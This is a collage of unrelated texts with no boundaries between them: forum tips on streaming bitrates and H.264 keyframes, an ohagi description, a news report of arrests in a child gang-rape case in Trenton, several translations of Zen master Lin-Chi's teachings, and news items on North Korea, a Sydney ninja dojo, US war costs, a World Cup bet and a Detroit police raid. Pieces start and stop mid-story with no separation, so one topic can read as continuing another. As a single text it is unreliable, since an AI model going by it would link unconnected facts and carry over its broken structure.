Also , Ustream does 4:3 or 16ratios , not 16:10 .
Just bear that in mind when choosing which resolution to use .
If you want to broadcast in high definition , you 're gonna have to broadcast at a high bitrate .
You 'll need 1000 - 2000 Kbps to stream at a resolution higher than 640* 360
► This is overkill .
You can stream 852x480 in 500 kbps and it will look pretty good .
If you 're obsessive about quality , VoD to Youtube instead . ►
H.264 appears to yield better performance , less framerate drop ►
The profile I 'm currently using for H.264 is ' Main ' Keyframe ' 10 seconds ' , ' 3.1 ' .
Lower keyframes appeared to result in frequent game freezes .
I was also able to further increase smoothness by setting processor affinity in SC2 to CPU 0 and FME to CPUs 1 , 2 and 3 .
I would imagine this would assist those with older quadcores .
I5 / I7 rigs will most likely not need that .
I do n't think the 10 second keyframe is a good idea either , needs to be lower than that .
► Me too , for SC2 , a 1 - 3 seconds keyframe should be used .
A keyframe is a full - quality no -delta frame .
That means if you scroll the screen ( like you do every few seconds in SC2 ) , for all the time between two keyframes , only differential data will be sent ( what pixels changed ) .
Since this is not a normal TV News scene where only the head moves , all the screen will look blurry and miscolored until the next keyframe arrives , or sufficient normal frames have been rendered ►
A lot of artifacting can be eliminated by picking an output resolution that is easily divisible by your input .
I changed my output ( now that I 've got a better net connection ) to 960x540 , which is exactly half of the input resolution ( 1920x1080 ) .
That eliminated a significant amount of artifacting and blur .----------------------------------------------------------------------------------------------------------------------------------

Ohagi are one of the myriad ball - shaped combinations of anko and sweet rice found among traditional Japanese desserts .
Heartier and more assertive on the teeth than some of their relatives , ohagi can stand in as either a sweet - yet - substantive snack to those so inclined , or a mildly - sweet dessert .
Simple ohagi consist of a ball of coarse sweet rice surrounded by a layer of sweet anko bean paste .
Another type of ohagi are inverted , with the rice on the outside and beans on the inside ; these are coated with a layer of sesame seeds or kinako , a type of soy flour .
New Jersey officials announced on Saturday six arrests in connection with the gang rape of a 7 - year - old girl who investigators believe was sold for sex by her 15 - year - old stepsister at a party in a Trenton high - rise last weekend .
The developments followed an intense , weeklong inquiry into what occurred on March 28 in a 13th - floor apartment at the Rowan Towers complex on West State Street , near the State Capitol .
Officials said they expected to make more arrests in the coming days .
Investigators arrested one man , Gregory Joseph Leary , 20 , of Trenton , on Thursday and charged him with raping the 15 - year - old girl , whom the authorities did not identify .
Another man Tiemear Lewis , 19 , of Trenton , was also charged in the case , officials said .
Joseph L. Bocchini Jr. , the Mercer County prosecutor , said his office would likely seek to try at least one of three juveniles who were charged , ages 17 , 14 and 13 , in adult court .

Zen teachings of Master Lin-Chi
The following passages are from " The Zen Teachings of Master Lin- Chi " translated by Burton Watson :
The Master instructed the group , saying : " Those who study the Dharma of the buddhas these days should approach it with a true and proper understanding .
If you approach it with a true and proper understanding , you wo n't be affected by considerations of birth and death , you 'll be free to go or stay as you please .
You do n't have to strive for benefits , benefits will come of themselves .
" Followers of the Way , the outstanding teachers from times past have all had ways of drawing people out .
What I want myself to impress on you is that you must n't be led astray by others .
If you want to use this thing , then use it and have no doubts or hesitations !
" When students today fail to make progress , where 's the fault ?
The fault lies in the fact that they do n't have faith in themselves !
If you do n't have faith in yourself , then you 'll be forever in a hurry trying to keep up with everything around you , you 'll be twisted and turned by whatever environment you 're in and you can never move freely .
But if you can just stop this mind that goes rushing around moment by moment looking for something , then you 'll be no different from the patriarchs and buddhas .
Do you want to get to know the patriarchs and buddhas ?
They 're none other than you , the people standing in front of me listening to this lecture on the Dharma !
" Students do n't have enough faith in themselves , and so they rush around looking for something outside themselves .
But even if they get something , all it will be is words and phrases , pretty appearances .
They 'll never get at the living thought of the patriarchs !
" Make no mistake , you followers of Ch'an .
If you do n't find it in this life , then for a thousand kalpas you 'll be born again and again in the three - fold world , you 'll be lured off by what you think are favorable environments and be born in the belly of a donkey or a cow !
" Followers of the Way , as I look at it , we 're no different from Shakyamuni .
In all our various activities each day , is there anything we lack ?
The wonderful light of the six faculties has never for a moment ceased to shine .
If you could just look at it this way , then you'd be the kind of person who has nothing to do for the rest of his life .
" Fellow believers , ' There is no safety in the threefold world ; it is like a burning house . '
This is no place for you to linger long !
The deadly demon of impermanence will be on you in an instant , regardless of whether you 're rich or poor , old or young .
" If you want to be no different from the patriarchs and buddhas , then never look for something outside yourselves .
The clean pure light in a moment of your mind -- that is the Essence - body of the Buddha lodged in you .
The undifferentiated light in a moment of your mind ~that is the Bliss - body of the Buddha lodged in you .
The undiscriminating light in a moment of your mind -- that is the Transformtion - body of the Buddha lodged in you .
These three types of bodies are you , the person who stands before me now listening to this lecture on the Dharma !
And simply because you do not rush around seeking anything outside yourselves , you can command these fine faculties .
" According to the expounders of the sutras and treatises , the threefold body is to be taken as some kind of ultimate goal .
But as I see it , that 's not so .
This threefold body is nothing but mere names .
Or they 're three types of dependencies .
One man of early times said , ' The body depends on doctrine for its definition , and the land is discussed in terms of the reality . '
This 'body ' of the Dharma - realm , or reality , and this 'land ' of the Dharma - realm we can see clearly are no more than flickering lights .
" Followers of the Way , you should realize that the person who manipulates these flickering lights is the source of the buddhas , the home that all followers of the way should return to .
Your physical body made up of the four great elements does n't know how to preach the Dharma or listen to the Dharma .
Your spleen and stomach , your liver and gall , do n't know how to preach the Dharma or listen to the Dharma .
The empty spaces do n't know how to preach the Dharma or listen to the Dharma .
What is it , then , that knows how to preach the Dharma or listen to the Dharma ?
It is you who are right here before my eyes , this lone brightness without fixed shape or form -- this is what knows how to preach the Dharma and listen to the Dharma .
If you can see it this way , you 'll be no different from the patriarchs and the buddhas .
" But never at any time let go of this even for a moment .
Everything ~ that meets your eyes is this .
But 'when feelings arise , wisdom is blocked ; when thoughts waver , reality departs , ' therefore you keep being reborn again and again in the threefold world and undergoing all kinds of misery .
But as I see it , there are none of you incapable of profound understanding , none of you are incapable of emancipation .
" Followers of the Way , this thing called mind has no fixed form ; it penetrates all the ten directions .
In the eye we call it sight ; in the ear we call it hearing ; in the nose it detects odors , in the mouth it speaks discourse ; in the hand it grasps , in the feet it runs along .
Basically it is a single bright essence , but it divides itself into these six functions .
And because this single mind has no fixed form , it is everywhere in a state of emancipation .
Why do I tell you this ?
Because you followers of the Way seem to be incapable of stopping this mind that goes rushing around everywhere looking for something .
So you get caught up in those idle devices of the men of old .
Someone asked , " What is the Buddha devil ? "
The Master said , " If you have doubts in your mind for an instant , that 's the Buddha devil .
But if you can understand that the ten thousand phenomena were never born , that the mind is like a conjurers trick , then not one speck of dust , not one phenomenon will exist .
Everywhere will be clean and pure , and this will be Buddha .
Buddha and devil just refer to two states , one stained , one pure .
" As I see it , there 's no Buddha , no living beings , no long ago , no now .
If you want to get it , you 've already got it -- it 's not something that requires time .
There 's no religious practice , no enlightenment , no getting anything , no missing out on anything .
At no time is there any other Dharma than this .
If anyone claims there is a Dharma superior to this , I say it must be a dream , a phantom .
All I have to say to you is simply this .
" Followers of the Way , this lone brightness before my eyes now , this person plainly listening to me -- this person is unimpeded at any point but penetrates the ten directions , free to do as he pleases in the threefold world .
No matter what the environment he may encounter , with its peculiarities and differences , he can not be swayed or pulled awry .
In the space of an instant he makes his way into the Dharma - realm .
If he meets a buddha he preaches to the buddha , if he meets a patriarch , he preaches to the patriarch , if he meets an arhat , he preaches to the arhat , if he meets a hungry ghost , he preaches to the hungry ghost .
He goes everywhere , wandering through many lands , teaching and converting living beings , yet never becomes separated from his single thought .
Every place for him is clean and pure , his light pierces the ten directions , the ten thousand phenomena are a single thusness .
Followers of the Way , the really first - rate person knows right now that from the first theres never been anything that needed doing .
Its because you dont have enough faith that you rush around moment by moment looking for something .
You throw away your head and hunt for your head , and you cant seem to stop yourselves .
You are like the bodhisattva of perfect and immediate enlightenment , who manifests his body in the dharma realm but who , in the midst of the pure land , still hates the state of common mortal and prays to become a sage .
People like that have yet to forget about choices ; their minds are still occupied with thoughts about purity and impurity .
But the Chan school doesnt see things that way .
What counts is this present moment ; theres nothing that requires a lot of time .
Everything I say to you is for the moment only , medicine to cure the disease .
Ultimately it has no true reality .
If you can see things in this way you will be true people who have left the household , free to spend ten thousand pieces of gold every day .
Followers of the Way , dont let just anyone put their stamp of approval on your face ; dont say , I understand Zen ; I understand the Way , spouting off like a waterfall .
All that sort of thing is karma , leading to hell .
If you are a person who honestly wants to learn the Way , dont go looking for the worlds mistakes , but set about as fast as you can looking for true and proper understanding .
If you can acquire true and proper understanding thats clear and complete , then you can think about calling it quits .
" Followers of the Way , you take the words that come out of the mouths of a bunch of old teachers to be a description of the true Way .
You think , ' This is a most wonderful teacher and friend .
I have only the mind of a common mortal , I would never dare to try to fathom such venerableness . '
Blind idiots !
You go through life with this kind of understanding , betraying your own two eyes , cringing and faltering like a donkey on an icy road , saying , ' I would never dare speak ill of such a good friend , I 'd be afraid of making mouth karma !'
" Followers of the Way , the really good friend is someone who dares speak ill of the Buddha , speak ill of the patriarchs , pass judgment on anyone in the world , throw away the Tripitaka , revile those little children , and in the midst of opposition and assent search out the real person .
So for the past twelve years , though I 've looked for this thing called karma , I 've never found so much as a particle of it the size of a mustard seed .
" Those Ch'an masters who are as timid as a new bride are afraid they might be expelled from the monastery or deprived of their meal of rice , worrying and fretting .
But from times past the real teachers , wherever they went , were never listened to and were always driven out -- that 's how you know they were men of worth .
If everybody approves of you wherever you go , what use can you be ?
Hence the saying , let the lion give one roar and the brains of the little foxes will split open .
" Followers of the Way , here and there you hear it said that there is a Way to be practiced , a Dharma to become enlightened to .
Will you tell me then just what Dharma there is to be enlightened to , what Way there is to practice ?
In your present aetivities , what is it you lack , what is it that practice must mend ?
But those little greenhorn monks do n't understand this and immediately put faith in that bunch of wild fox spirits , letting them spout their ideas and tie people in knots , saying , ' When principle and practice match one another and proper precaution is taken with regard to the three types of karma of body , mouth , and mind , only then can one attain Budhahood . '
People who go on like that are as plentiful as springtime showers .
" A man of old said , ' If along the road you meet a man who is master of the Way , whatever you do , do n't talk to him about the Way . '
Therefore it is said , ' If a person practices the way , the Way will never proceed .
Instead , ten thousand kinds of mistaken environments will vie in poking up their heads .
But if the sword of wisdom comes to cut them all down , then even before the bright signs manifest themselves , the dark signs will have become bright .
Therefore a man of old said , ' The everyday mind -- that is the Way . '
" Fellow believers , what are you looking for ?
This man of the Way who depends on nothing , here before my eyes now listening to the Dharma - - his brightness shines clearly , he has never lacked anything .
If you want to be no different from the patriarchs and buddhas , learn to see it this way and -- never give in to doubt or questioning .
When your mind moment by moment never differentiates , it may be called the living patriarch .
If the mind differentiates , its nature and manifestations become separated from one another .
But so long as it does not differentiate , its nature and manifestations do not become separated . "
Someone asked , " What do you mean by the true Buddha , the true Dharma , and the true Way ?
Would you be good enough to explain to us ? "
The Master said , " Buddha - - this is the cleanness and purity of the mind .
The Dharma - - this is the shining brightness of the mind .
The Way -- this is the pure light that is never obstructed anywhere .
The three are in fact one .
All are empty names and have no true reality .
" The true and proper man of the Way from moment to moment never permits any interruption in his mind .
When the great teacher Bodhidharma came from the west , he was simply looking for a man who would not be misled by others .
Later the Second Patriarch encountered Bodhidharma , and after hearing one word , he understood .
Then for the first time he realized that up to then he had been engaged in useless activity and striving .
" My understanding today is no different from that of the patriarchs and buddhas .
If you get it with the first phrase , you can be a teacher of the patriarchs and buddhas .
If you get it with the second phrase , you can be a teacher of human and heavenly beings .
If you get it with the third phrase , you can't even save yourself ! "
Someone asked , " What was Bodhidharma 's purpose in coming from the west ? "
The Master said , " If he had had a purpose , he would n't have been able to save even himself !
"
The questioner said , " If he had no purpose , then how did the Second Patriarch manage to get the Dharma ? "
The Master said , " Getting means not getting . "
" If it means not getting , " said the questioner , " then what do you mean by not getting ? "
The Master said , " You can't seem to stop your mind from racing around everywhere seeking something .
That 's why the patriarch said , ' Hopeless fellows - - using their heads to look for their heads ! '
You must right now turn your light around and shine it on yourselves , not go seeking somewhere else .
Then you will understand that in body and mind you are no different
from the patriarchs and the buddhas , and that there is nothing to do .
Do that and you may speak of 'getting the Dharma . '
" Fellow believers , at this time , having found it impossible to refuse , I have been addressing you , putting forth a lot of trashy talk .
But make no mistake !
In my view , there are in fact no great number of principles to be grasped .
If you want to use the thing , then use it .
If you do n't want to use it , then let it be .
" Followers of the Way , do n't take the Buddha to be some sort of ultimate goal .
In my view he 's more like the hole in a privy .
Bodhisattvas and arhats are so many cangues and chains , things for fettering people .
Therefore , Manjushri grasped his sword , ready to kill Gautama , and Angulimala , blade in hand , tried to do injury to Shakyamuni .
" Followers of the Way , there is no Buddha to be gained , and the Three Vehicles , the five natures , the teaching of the perfect and immediate enlightenment are all simply medicines to cure diseases of the moment .
None have any true reality .
Even if they had , they would still all be mere shams , placards proclaiming superticial matters , so many words lined up , pronouncements of such kind .
" Followers of the Way , there are certain baldheads who turn all their efforts inward , seeking in this way to find some otherworldly truth .
But they are completely mistaken !
Seek the Buddha and you 'll lose the Buddha .
Seek the Way and you 'll lose the Way .
Seek the patriarchs and you 'll lose the patriarchs .
" Fellow believers , do n't mistake me !
I do n't care whether you understand the sutras and treatises .
I do n't care whether you are rulers or great statesmen .
I do n't care whether you can pour out torrents of eloquence .
1 do n't care whether you display brilliant intellects .
All I ask is that you have true and proper understanding . "
" Fellow believers , do not use your minds in a mistaken manner , but be like the sea which rejects the bodies of the dead .
While you continue to carry such dead bodies and go racing around the world with them , you only obstruct your own vision and create obstacles in your mind .
When no clouds block the sun , the beautiful light of heaven shines everywhere .
When no disease afflicts the eye , it does not see phantom flowers in the empty air .
" Followers of the Way , if you wish to be always in accord with the Dharma , never give way to doubt .
' Spread it out and it fills the whole Dharma - realm , gather it up and it 's tinier than a thread of hair . '
Its lone brightness gleaming forth , it has never lacked anything .
' The eye does n't see it , the ear does n't hear it . '
What shall we call this thing ?
A man of old said , ' Say something about a thing and already you 're off the mark . '
You 'll just have to see it for yourselves .
What other way is there ?
But there 's no end to this talk .
Each of you , do your best !
Thank you for your trouble . "
The Master was entering an army encampment to attend a dinner when he saw one of the officers at the gate .
He pointed to a bare wooden gatepost and said , " A common mortal or a sage ? "
The officer had no reply .
The Master struck the gatepost and said , " Even if you had managed a reply , it would still just be a wooden post ! "
With that he entered the camp .
Someone asked , " what is the true nature of mind ? "
The Master replied , " o fficially even a needle cannot enter ; unofficially you can drive a horse and cart through . "
The following is translated by D.T. Suzuki
An ancient doctor says that the body is dependent on its meaning , and the ground is describable by its substance .
Being so , we know that Dharma - body and Dharma - ground are reflections of the ( original ) light .
O Venerable Sirs , let us take hold of this person who handles these reflections .
For he is the source of all the Buddhas and the house of truth - seekers everywhere .
The body made up of the four elements does not understand how to discourse or how to listen to a discourse .
Nor do the liver , the stomach , the kidneys , the bowels .
Nor does the vacuity of space .
That which is most unmistakably perceivable right before your eyes , though without form , yet absolutely identifiable — this is what understands the discourse and listens to it .
When this is thoroughly seen into , there is no difference between yourselves and the old masters .
Only let not your insight be interrupted through all the periods of time , and you will be at peace with whatever situation you come into .
When wrong imaginations are stirred , the insight is no more immediate ; when thoughts are changeable , the essence is no more the same .
For this reason , we transmigrate in the triple world and suffer varieties of pain .
As I view the matter in my way , deep indeed is ( Reality ) , and there is none who is not destined for emancipation .
O Followers of the Way , Mind has no form and penetrates every corner of the universe .
In the eye it sees , in the ear it hears , in the nose it smells , in the mouth it talks , in the hand it seizes , in the leg it runs .
The source is just one illuminating essence , which divides itself into six functioning units .
Let all interfering thoughts depart from Mind , and you experience emancipation wherever you go .
What do you think is my idea of talking to you like this ?
I simply wish to see you stop wandering after external objects , for it is because of this hankering that the old masters play tricks on you .
* * *
Followers of the Way , when you come to view things as I do , you are able to sit over the heads of the Enjoyment - and Transformation - Buddhas ; the Bodhisattvas who have successfully mounted the scale of ten stages look like hirelings ; those who have attained the stage of full enlightenment resemble prisoners in chains ; the Arhats and Pratyeka - Buddhas are cesspools ; Bodhi and Nirvana are a stake to which donkeys are fastened .
Why so ?
Because .
O Followers of the Way , you have not yet attained the view whereby all kalpas are reduced to Emptiness .
When this is not realized , there are all such hindrances .
It is not so with the true man who has insight into Reality .
He gives himself up to all manner of situations in which he finds himself in obedience to his past karma .
He appears in whatever garments re ready for him to put on .
As it is desired of him either to move or to sit quietly , he moves or sits .
He has not a thought of running after Buddhahood .
He is free from such pinings .
Why is it so with him ?
Says an ancient sage , " When the Buddha is sought after , he is the cause of transmigration . "
O Venerable Sirs , time is not to be wasted .
Do not commit yourselves to a grave mistake by convulsively looking around your neighborhood and not within yourselves .
You make mistakes by truing to master Zen , to master the Way , to learn words and phrases , to seek for Buddhas and Fathers and good friends .
There is just one parenthood for you , and outside of it what do you wish to acquire ?
Just look within yourselves .
The Buddha tells us the story of Yajnadatta .
Thinking he had lost his head , he wildly ran after it ; but when he found that he had never lost it , he became a peaceful man .
O Followers of the Way , be just yourselves , stop your hysterical antics .
There are some old baldheaded fools who know not good from bad .
They recognize all kinds of things , they see spirits , they see ghosts , they look this way and that way , they like fair weather , they like rainy weather .
If they go on like this , they are sure one day to appear before the King of Death , who will ask them to pay up their debts by swallowing red - hot iron balls .
Sons and daughters of good families become possessed of this uncanny fox - spirit and go wildly astray even against their original sanity .
Poor blind followers !
Some day they will have to pay up their board .
This passage is translated by Thomas Cleary
True Perception and Understanding :
People who study Buddhism should seek real , true perception and understanding for now .
If you attain real , true perception and understanding , birth and death wo n't affect you - you are free to go or stay .
You need n't seek wonders , for wonders come of themselves .
Self Confidence :
What I point out to you is only that you should n't allow yourselves to be confused by others .
Act when you need to , without further hesitation or doubt .
People today can't do this - what is their affliction ?
Their affliction is in their lack of self - confidence .
If you do not spontaneously trust yourself sufficiently , you will be in a frantic state , pursuing all sorts of objects and being changed by those objects , unable to be independent .
Buddha Within :
There is no stability in the world ; it is like a house on fire .
This is not a place where you can stay for a long time .
The murderous demon of impermanence is instantaneous , and it does not choose between the upper and lower classes , or between the young and old .
If you want to be no different from the Buddhas and Zen masters , just do n't seek externally .
The pure light in a moment of awareness in your mind is the Buddha 's essence within you .
The nondiscriminating light in a moment of awareness in your mind is the Buddha 's wisom within you .
The undifferentiated light in a moment of awareness in your mind is the Buddha 's manifestation within you .
No Obsessions :
It is most urgent that you seek real , true perception and understanding , so you can be free in the world and not confused by ordinary spiritualists .
It is best to have no obsessions .
Just do not be contrived .
Simply be normal .
You impulsively seek elsewhere , looking to others for your own hands and feet .
This is already mistaken .
The Mind Ground :
The mind ground can go into the ordinary , into the holy , into the pure , into the defiled , into the real , into the conventional ; but it is not your " real " or " conventional , " " ordinary " or " holy . "
It can put labels on all the real and conventional , the ordinary and the holy , but the real and conventional , the ordinary and the holy , can not put labels on someone in the mind ground .
If you can get it , use it , without putting any more labels on it .
Understanding People :
When followers of Zen come to see me , I have already understood them completely .
How can I do this ?
Simply because my perception is independent - externally I do not grasp the ordinary or the holy , internally I do not dwell on the fundamental .
I see all the way through and do not doubt or err anymore .
Autonomy :
Just be autonomous wherever you are , and right there is realization .
Situations that come up cannot change you .
Even if you have bad habits , you will spontaneously be liberated from them .
Spiritual Dilettantes :
Zen students today are totally unaware of truth .
They are like foraging goats that pick up whatever they bump into They do not distinguish between the servant and the master , or between guest and host .
People like this enter Zen with distorted minds , and are unable to enter effectively into dynamic situations .
They may be called true initiates , but actually they are really mundane people .
Those who really leave attachments must master real , true perception to distinguish the enlightened from the obsessed , the genuine from the artificial , the unregenerate from the sage .
If you can make these discernments , you can be said to have really left dependency .
Professionally Buddhist clergy who cannot tell obsession from enlightenment have just left one social group and entered another social group .
They can not really be said to be independent .
Now there is an obsession with Buddhism that is mixed in with the real thing .
Those with clear eyes cut through both obsession and Buddhism .
If you love the sacred and despise the ordinary , you are still bobbing in the ocean of delusion .
Labels and Objective Truth :
Because you grasp labels and slogans , you are hindered by those labels and slogans , both those used in ordinary life and those considered sacred .
Thus they obstruct your perception of objective truth , and you cannot understand clearly .
The Free Self :
If you want to be free , get to know your real self .
It has no form , no appearance , no root , no basis , no abode , but is lively and buoyant .
It responds with versatile facility , but its function cannot be located .
Therefore when you look for it you become further from it , when you seek it you turn away from it all the more .
No Concern :
Just put thoughts to rest and do n't seek outwardly anymore .
When things come up , then give them your attention ; just trust what is functional in you at present , and you have nothing to be concerned about .
Blind Baldies :
There are blind baldies who , after they have eaten their fill , do zazen and practice meditation , arresting thoughts leaking out to prevent them from arising , shunning clamor and seeking quiet .
This is a deviated form of Zen .
Uncritical Acceptance :
You take the words of these ordinary Zen teachers for the real Way , supposing that Zen teachers are incomprehensible and as an ordinary person you dare not attempt to assess those old timers .
You are blind if you take this view all your life , contrary to the evidence of your own eyes .
Tourist Trap :
At Zen centers they say there is a Way to be practiced and a religious truth to be realized .
Tell me , what religious truth is realized and what Way is practiced ?
In your present functioning , what do you lack ?
What would you fix ?
Younger newcomers , not understanding this , immediately believe these mesmerists and let them talk about things that tie people up .
Supernormal Faculties :
The six supernormal faculties of the enlightened are the ability to enter the realm of form without being confused by form , to enter the realm of sound without being confused by sound , to enter the realm of scent without being confused by scent , to enter the realm of flavor without being confused by flavor , to enter the realm of feeling without being confused by feeling , to enter the realm of phenomena without being confused by phenomena .
Objective Perception and Understanding :
If you want to perceive and understand objectively , just do n't allow yourself to be confused by people .
Detach from whatever you find inside or outside yourself - detach from religion , tradition , and society , and only then will you attain liberation .
When you are not entangled in things , you pass through freely to autonomy .
Zen Teaching :
I have no doctrine to give people - I just cure ailments and unlock fetters .
Adding Mud to Dirt :
There are Zen students who are in chains when they go to a teacher , and the teacher adds another chain .
The students are delighted , unable to discern one thing from another .
This is called a guest looking at a guest .
Slavery :
When I say there is nothing outside , students who do not understand me intepret this in terms of inwardness , so they sit silent and still , taking this to be Zen Buddhism .
This is a big mistake .
If you take a state of unmoving clarity to be Zen , you are recognizing ignorance as a slave master .
Movement and Stillness :
If you try to grasp Zen in movement , it goes into stillness .
If you try to grasp Zen in stillness , it goes into movement .
It is like a fish hidden in a spring , drumming up waves and dancing independently .
Movement and stillness are two states .
The Zen master , who does not depend on anything , makes deliberate use of both movement and stillness .
Image caption Pyongyang said all ties , including communications , would be cut
North Korea is to cut all relations with South Korea , Pyongyang 's official news agency reports .
KCNA said the North was also expelling all South Korean workers from a jointly - run factory north of the border .
The move comes after an international report blamed North Korea for sinking a South Korean warship .
Pyongyang denies it torpedoed the Cheonan near the inter-Korean maritime border on 26 March , killing 46 sailors .
South Korea says it plans to refer North Korea to the UN Security Council , and is seeking a unified international response to the incident .
' Puppet army gangs '
Tuesday 's KCNA reports announcing the severing of all ties - including communications - said the North was also banning South Korean ships and planes from its territorial waters and airspace .
Analysis Within a matter of days relations between the two Koreas have returned to the freezer .
The diplomatic goal now will be to ensure that a renewed cold war on the Korean peninsula does not generate into a hot conflict .
The United States is firmly backing South Korea but US Secretary of State Hillary Clinton - who has been in the Chinese capital Beijing as events unfolded - has failed to extract any public criticism of North Korea from the Chinese authorities .
Her hope will be that in private Beijing will tell Pyongyang in no uncertain terms that it should do nothing to inflame this crisis further .
" The Committee for the Peaceful Reunification of Korea ... formally declares that from now on it will put into force the resolute measures to totally freeze the inter-Korean relations , totally abrogate the agreement on non-aggression between the North and the South and completely halt the inter-Korean cooperation , " KCNA reported .
Pyongyang has also accused South Korea of trespassing in its waters .
In a warning to South Korea 's navy , a newsreader on North Korean state television ( KRT ) said : " South Korean puppet army gangs have been recently trespassing our territorial waters without restraint .
" They have conducted provocative acts which severely irritate us , by making dozens of warships intrude upon our waters from 14 to 24 May . "
The newsreader said that if this " deliberate provocation " continued , the North would " put into force practical military measures to defend its waters " .
North and South Korea are technically still at war after the Korean conflict ended without an armistice in 1953 .
While there were hopes of a reconciliation a few years ago , relations have been deteriorating since then and now appear to be at their lowest point in a decade , correspondents say .
Provocation
Amid the rising tensions , Seoul announced on Sunday it was ending trade relations with the North in response to the sinking of the Cheonan .
South Korea has also said it will drop propaganda leaflets into the North to tell people about the sinking , as well as setting up giant electronic billboards to flash messages .
ATTACKS BLAMED ON NORTH

It has resumed propaganda broadcasts to the North , playing radio programmes that will soon be broadcast via border loudspeakers .
The US , which has thousands of troops based in South Korea , has backed Seoul , condemning the incident and confirming late on Monday that it will hold joint anti-submarine naval exercises with South Korean forces .
US Secretary of State Hillary Clinton has said the US and China must work together to " fashion an effective response " to the sinking of the Cheonan .
Speaking in Beijing , Mrs Clinton said maintaining peace on the Korean peninsula was " a shared responsibility " between the countries .
China has called for all sides to show restraint , adding its voice to calls for international co-operation over the incident .
Vice Foreign Minister Cui Tiankai said Beijing was " ready to work together with the US and other parties and continue to stay in close touch on the situation on the Korean peninsula " .
On Tuesday Wu Dawei , China 's special representative for Korean affairs , arrived in Seoul for talks with Foreign Minister Yu Myung - hwan .
Analysts say China 's attitude is key , because it holds a veto in the Security Council and has in the past been reluctant to impose tough measures on Pyongyang .
Mrs Clinton is also due in Seoul for talks on Wednesday .

It had , but not in quite the way they expected .
The men tripped the 27 - year - old student , kicking him as he lay on the ground and grabbing his mobile phone and iPod .
What the assailants did not realise was that they were standing outside Ninja Senshi Ryu - western Sydney 's ninja warrior school .
They also failed to notice a ninja , Nathan Smith , standing in the shadows outside the dojo .
Mr Smith immediately alerted his sensei , or teacher .
Kaylan Soto , a sensei with 30 years '
Ninjutsu training , and three of his students raced out of the dojo towards the startled attackers .
All five crusaders were clad in the ninja 's traditional , all black uniform .
'' We would have been just a silhouette , '' one of the ninjas , Steve Ashley , said .
'' It was probably the worst place in Sydney where they could have taken him . ''
Mr Soto said it took the three assailants a few moments to realise what was going on .
When they did , they shot off .
'' You should have seen their faces when they saw us in ninja gear coming towards them , '' he said .
The ninjas gave chase , but the men escaped .
Police yesterday said they had made arrests in relation to the attack .

The medical student , who has been in Sydney for eight weeks on an exchange program , was left shaken but suffered only minor injuries .
As for the ninjas , they were back in training last night .
The cost of the United States ’ wars in Afghanistan and Iraq have cost taxpayers more than one trillion dollars , a Massachusetts nonprofit said Sunday , marking a grim milestone on the eve of the Memorial Day holiday .
According to the group , the threshold was crossed Sunday at 10:06 am ET , based on Congressional appropriations for the wars .
To date , the group notes , $ 747.3 billion has been appropriated for the U.S. war in Iraq and $ 299 billion for the war in Afghanistan .

The group , National Priorities Project , conveyed the size of US war spending by highlighting other things that could have been bought with the money .
For example , for the price of America ’s two wars , the US could give $ 5,500 in Pell grants to all of America ’s 19 million college students for the next nine years .
One trillion would also pay the entire healthcare bill for 294 million people , or 440 million children , the group says .
A billing pending in Congress will add another $ 37 billion to this year ’s spending .
In a press release posted Friday , the group gave a list of other considerations that could have been purchased for $ 1 trillion .
Among them :
What Can You Get For $ 1 Trillion ?
* Federal Funding For Higher Education — $ 1 trillion would give the maximum Pell Grant award ( $ 5,500 ) to all 19 million U.S. college and university students for the next 9 years .
* 294,734,961 people with health care for one year , or * 21,598,789 public safety officers for one year , or * 17,149,392 music and arts teachers for one year , or * 7,779,092 affordable housing units , or * 440,762,472 children with health care for one year , or * 137,233,969 head start places for children for one year , or * 16,427,497 elementary school teachers for one year , or * 1,035,282,468 homes with renewable electricity for one year
The group also highlights the economic toll of war on local communities , by relating what could have been bought with the money that ’s been spent fighting in Afghanistan and Iraq .

A particularly notable example is the case of a nearby city that plans to cut its library budget this year .
For the amount of money the city has devoted to war , it could have doubled its library budget and funded it for the next half - century .
Residents of Brooklyn , New York , meanwhile , could have received free renewable electricity for 19 years .
And this is just the money that ’s been extracted in taxes from those two communities .
The group adds details and gives more examples :
ADVERTISEMENT
Taxpayers in Natick , Massachusetts will pay $ 206.9 million for total Iraq and Afghanistan war spending since 2001 .
For that amount , instead of implementing a proposed 4 percent cut for Natick ’s libraries in 2011 , the town could double its total current library budget , and pay for it for 56 years .
Taxpayers in the Borough of Brooklyn , New York will pay $ 9 billion for total Iraq and Afghanistan war spending since 2001 .
That ’s enough to supply renewable electricity to every household in Brooklyn for 19 years .
As college and university tuitions grow , community colleges are increasingly popular sources of affordable education .
At Greenfield Community College in Massachusetts , for the cost of the Afghanistan war “ surge ” ( est. $ 37 billion ) you could cover all tuition and fees for all full - and part - time ( half - time ) students for the next 762 semesters ( 381 years ) .
WHAT DOES $ 1 TRILLION LOOK LIKE ?
$ 1,000,000,000,000 ( “ 1 ” and twelve zeros )
If you earned $ 1 million a year , it would take you 1 million years to earn $ 1 trillion .
In Dollar Bills :
If you converted $ 1 trillion into one dollar bills , and laid them end to end , it would reach 98 million miles .
That ’s 4,000 times around the Earth .
Its 205 trips to the Moon .
And back .
It ’s more than the distance to the Sun .
In Silver Dollars :
If someone handed you a silver dollar every second , it would take almost 32,000 years for them to hand you $ 1 trillion .
Not that you could hold them – they ’d weigh nearly 9 million tons .
The group maintains a “ cost of war ” counter that was down as of this writing because of increased web traffic to the site .

Image caption Wayne Rooney is viewed by many as England 's best hope in the World Cup
A bookmaker says a Welsh punter stands to win £ 440,000 if England 's Wayne Rooney finishes top World Cup scorer .
Coral said a regular at one of its shops in Haverfordwest , Pembrokeshire , walked in and placed £ 37,000 at odds of 11 - 1 on the striker .
It said it was the largest wager it had taken so far for the competition that has kicked - off in South Africa .
Spokesman David Stevens said it was " an unusual bet " in itself , and more so as it was placed by a Welshman .
" We knew the patriotic gamble on England would begin ahead of their opening match against USA this weekend , but little did we think that we would take our biggest bet yet from a Welshman , " he added .
" They may not be cheering on England in Wales , but one punter at least will be hoping Wayne Rooney is a hit in South Africa . "
( CNN ) --
An attorney representing the family of a 7 - year - old girl shot to death Sunday in a police raid is accusing the Detroit Police Department of misrepresenting the incident .
In an interview with CNN affiliate WDIV on Monday , Michigan attorney Geoffrey Fieger said he obtained video footage of the incident captured by a crew filming for the A&E network show , " The First 48 . "
Fieger , who did n't say how he received the tape , said it shows officers rushing the home and throwing a flash grenade through a window before one officer fires into the home from the front porch .
However , according to Assistant Police Chief Ralph Godbee , preliminary information indicates that members of the Detroit Police Special Response Team approached the house and announced themselves as police .
Godbee cited the officers involved and at least one independent witness .
Godbee said officers used a " flash bang " device , entered the home and encountered a 46 - year - old female inside the front room .
